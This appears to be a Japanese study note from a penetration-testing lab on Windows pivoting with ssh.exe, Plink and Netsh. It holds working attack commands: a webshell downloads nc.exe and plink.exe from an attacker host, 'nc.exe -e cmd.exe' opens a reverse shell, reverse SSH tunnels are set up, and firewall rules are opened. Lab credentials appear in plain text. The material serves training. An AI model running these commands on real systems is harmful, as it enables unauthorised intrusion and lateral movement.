- [[#01_ssh.exe|01_ssh.exe]]
	- [[#01_ssh.exe#デフォルトインストール済みSSH関連EXE|デフォルトインストール済みSSH関連EXE]]
- [[#02_Plink|02_Plink]]
	- [[#02_Plink#Port3389をKaliのループバックに転送|Port3389をKaliのループバックに転送]]
- [[#03_Netsh|03_Netsh]]
	- [[#03_Netsh#テスト後のポート閉鎖|テスト後のポート閉鎖]]
- [[#Capstone|Capstone]]

##  01_ssh.exe
### デフォルトインストール済みSSH関連EXE
- scp.exe
- sftp.exe
- ssh.exe
```PATH
%systemdrive%\Windows\System32\OpenSSH
```

![](Assets/Images/Pasted%20image%2020260429200522.png)

Kali
```bash
sudo systemctl start ssh

xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.212.64
```

Victim
```cmd
where ssh
C:\Windows\System32\OpenSSH\ssh.exe

ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2

ssh -N -R 9998 kali@192.168.45.206
```

kali
```bash
#ssを使用して、Kali マシン上で SOCKS プロキシ ポートが開いているかどうかを確認
ss -ntplu
tcp    LISTEN  0        128                                   [::1]:9998              [::]:*                                           

tail /etc/proxychains.conf
socks5 127.0.0.1 9998

#SQLに接続
proxychains psql -h 10.4.212.215 -U postgres
D@t4basePassw0rd!
#以下postgre
\l

```
---
## 02_Plink
*PuTTYのコマンドラインツール

![](Assets/Images/Pasted%20image%2020260429200512.png)
*シナリオでは事前にターゲットにwebshellを蔵置済
![](Assets/Images/Pasted%20image%2020260429200508.png)

Kali
```bash
sudo systemctl start apache2

find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe

sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```
バイナリが配置されたら、MULTISERVER03からダウンロードを開始できます。WebシェルからPowerShell のwgetワンライナーを使用して、 nc.exeをダウンロードします。

Kali
```bash
nc -nvlp 4446
```

Webシェルから、PowerShellにKaliマシンのWebサーバー（-Uri http://192.168.45.206/nc.exe ）からnc.exeをダウンロードし、MULTISERVER03のC:\Windows\Tempに-OutFile で書き込むよう指示するコマンドを実行します。つまり、以下のコマンドを実行します。
```
powershell wget -Uri http://192.168.45.206/nc.exe -OutFile C:\Windows\Temp\nc.exe

C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.206 4446
#実行後shellを取得できる
```

Kali
```bash
find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe

sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

### Port3389をKaliのループバックに転送
![](Assets/Images/Pasted%20image%2020260429200451.png)
Victim
```cmd
powershell wget -Uri http://192.168.45.206/plink.exe -OutFile C:\Windows\Temp\plink.exe

C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.206
```

Kali
```bash
#ポート確認
ss -ntplu
tcp       LISTEN     0          128                                   127.0.0.1:9833               0.0.0.0:* 

xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

---
## 03_Netsh
- *標準搭載されているファイアウォール設定ツール
- *Netshを使用してポートフォワードを作成するには管理者権限が必要*
![](Assets/Images/Pasted%20image%2020260429200443.png)

Kali
```bash
xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.212.64
```

Victim
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.212.64 connectport=22 connectaddress=10.4.212.215

#netstatを使用してポート 2222 がリッスンしていることを確認
netstat -anp TCP | find "2222"

# netsh インターフェイスの portproxyサブコンテキストでshow allコマンドを発行して、ポート転送が保存されていることを確認
netsh interface portproxy show all
```

Kali
```bash
sudo nmap -sS 192.168.212.64 -Pn -n -p2222
PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1
#2222は防がれていることが確認できる
```

アクセスするには、MULTISERVER03 のファイアウォールに穴を開ける必要があります。
Victim
```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.212.64 localport=2222 action=allow
OK.
```

kali
```bash
sudo nmap -sS 192.168.212.64 -Pn -n -p2222
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

ssh database_admin@192.168.212.64 -p2222
sqlpass123
```

### テスト後のポート閉鎖
```cmd
#名前「port_forward_ssh_2222」でルールを参照して削除する方法
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
Deleted 1 rule(s).
Ok.

#作成したポート転送を削除する方法
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.212.64
```

## Capstone
```bash
#Kali
xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.212.64:3389

#Victim
ssh -N -R 9998 kali@192.168.45.206
kali

ss -ntplu

proxychains ./60440b10bbd0b9c9c71bf678ddd8e8ce-netsh_exercise_client -i 10.4.212.215 -p 4545
```